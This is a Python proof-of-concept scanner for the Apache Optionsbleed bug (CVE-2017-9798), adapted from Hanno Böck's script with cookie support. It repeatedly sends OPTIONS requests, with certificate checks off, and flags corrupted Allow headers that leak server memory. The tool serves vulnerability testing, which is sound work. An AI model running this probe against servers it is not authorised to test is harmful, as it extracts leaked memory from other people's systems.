#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Optionsbleed proof of concept test
# by Hanno BÃ¶ck
#
# Modified by MickCue(GitHub) | Forked - Added cookie support and changed to use requests

import argparse
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


session = ""


def test_bleed(url, args):

    if args.cookie:
        session = args.cookie

        r = requests.options(url , cookies={''+session.split('=')[0]+'':''+session.split('=')[1]+''}, verify=False)
    else:
        r = requests.options(url , verify=False)


    raw_headers = r.headers
    allow= ""


    for a in raw_headers:

        if "Allow" in a:
            allow = r.headers['allow']


    if allow == "":
        print("[empty] %s" % (url))
    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$", allow):
        
        z = [x.strip() for x in allow.split(',')]
        if len(z) > len(set(z)):
            print("[duplicates] %s: %s" % (url, repr(allow)))
        elif args.all:
            print("[ok] %s: %s" % (url, repr(allow)))
        #else:
            #print("[No Issues]")

    elif re.match("^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$", allow):
        print("[spaces] %s: %s" % (url, repr(allow)))
    else:
        print("[bleed] %s: %s" % (url, repr(allow)))
    return True


parser = argparse.ArgumentParser(
         description='Check for the Optionsbleed vulnerability (CVE-2017-9798).',
         epilog="Tests server for Optionsbleed bug and other bugs in the allow header.\n\n"
         "Automatically checks http://, https://, http://www. and https://www. -\n"
         "except if you pass -u/--url (which means by default we check 40 times.)\n\n"
         "Explanation of results:\n"
         "[bleed] corrupted header found, vulnerable\n"
         "[empty] empty allow header, does not make sense\n"
         "[spaces] space-separated method list (should be comma-separated)\n"
         "[duplicates] duplicates in list (may be apache bug 61207)\n"
         "[ok] normal list found (only shown with -a/--all)\n",
         formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('hosttocheck',  action='store',
                    help='The hostname you want to test against')
parser.add_argument('-n', nargs=1, type=int, default=[10],
                    help='number of tests (default 10)')
parser.add_argument("-a", "--all", action="store_true",
                    help="show headers from hosts without problems")
parser.add_argument("-u", "--url", action='store_true',
                    help="pass URL instead of hostname")
parser.add_argument("-c", "--cookie", help="Add Cookie")
args = parser.parse_args()
howoften = int(args.n[0])


dup = []

# Note: This disables warnings about the lack of certificate verification.
# Usually this is a bad idea, but for this tool we want to find vulnerabilities
# even if they are shipped with invalid certificates.
#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#pool = urllib3.PoolManager(10, cert_reqs='CERT_NONE')

if args.url:
    #print(args.cookie)
    #print("How Often:"+str(howoften))
    if howoften is 10:
        howoften = 40
    for i in range(howoften):
            try:
                if test_bleed(args.hosttocheck, args) is False:
                    break
            except Exception as e:
                pass


else:
    for prefix in ['http://', 'http://www.', 'https://', 'https://www.']:
        for i in range(howoften):
            try:
                if test_bleed(prefix+args.hosttocheck, args) is False:
                    break
            except Exception as e:
                pass
